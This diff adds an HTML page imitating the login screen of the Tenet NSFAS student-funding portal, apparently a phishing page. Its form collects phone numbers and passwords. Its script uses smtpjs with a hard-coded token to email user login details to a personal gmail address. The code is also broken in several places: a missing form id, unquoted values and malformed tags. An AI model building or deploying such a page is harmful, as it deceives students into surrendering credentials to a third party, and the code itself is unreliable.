@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head font-family="Ebrima">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Tenet NSFAS PWA</title>
+    <style>
+	
+	 
+	
+	.bigger-text {
+            font-size: 47px; /* Adjust the value to make the text bigger */
+        }
+	
+        body, html {
+            margin: 0;
+            padding: 0;
+			 background-color: #000000 ; /* Set the background color */
+            color:#FFFFFF ; /* Set the text color */
+            font-family: Arial, sans-serif;
+            height: 37%;
+            font-family: Ebrima, Ebrima;
+        }
+
+        .full-width-container {
+            width: 100%;
+            height: 100%;
+            background-color: #026c59; /* Optional: Setting a background color for visibility */
+            box-sizing: border-box;
+            padding: 20px; /* Optional: Adding some padding for content */
+        }
+		
+		.login-container {
+            text-align: center;
+            margin-top: 10px;
+        }
+
+		.login-container input {
+            margin-bottom: 10px;
+            width: 350px; /* Set the width as needed */
+            padding: 19px; /* Optional: Add padding for better aesthetics */
+        }
+		
+		
+       .login-container input[type="submit"] {
+            background-color: #a5d274; /* Set the background color */
+            color: #fff; /* Set the text color */
+            border: none;
+            width: 350px;
+            padding: 19px;
+            cursor: pointer;;
+    </style>
+</head>
+<body font-family: Ebrima>
+    <div class="full-width-container">
+        <svg width="140" height="50">
+    <image xlink:href="download.svg" width="140" height="60" />
+        </svg>
+
+    </div>
+	
+	<h1 align="center"><p class="bigger-text">
+        Welcome Back!
+    </h1>
+	
+	<legend><H4 align="center">Sign in with your Phone number and Password</legend>
+	
+	<div class="login-container">
+       
+        <form action="submit" method="post">
+            <label for="username"></label><br>
+            <input type="text" name="fname" size="50" value="Phone Number" required><br>
+
+            <label for="password"></label><br>
+            <input type="text" id="password" name="password" value="Password" required><br>
+
+			<a href="https://www.tenetnsfas.co.za/auth/login">
+           <input type="submit" value="Let's go">
+		   </a>
+        </form>
+    </div>
+	     
+		 Forgot your password? Reset here<br>
+		 Is your account not set up yet?<a href="https://www.tenetnsfas.co.za/auth/identity-verification"> Register here</a>
+		 
+		 
+		 
+		 
+		 
+		
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Perform authentication (replace this with your actual authentication logic)
+            if (username === 'valid_username' && password === 'valid_password') {
+                sendEmail(username);
+                alert('Login successful! Email notification sent.');
+            } else {
+                alert('Invalid username or password.');
+            }
+        });
+
+        function sendEmail(username) {
+            Email.send({
+                SecureToken: 24D6F3FB6E1127FA7F2548FD36899B998E, // Obtain from SMTPJS after signing up
+                To: ezaga.umphanto@gmail.com,
+                From: 'sender@example.com',
+                Subject: 'Login Event',
+                Body: 'User ' + username + ' has logged in.'
+            }).then(
+                message => console.log(message)
+            );
+        }
+    </script>
+
+</body>
+</html>
+ 
+		 
+		 
+		 
+		 
+		 
+		 
+		 
+</body>
+</html>
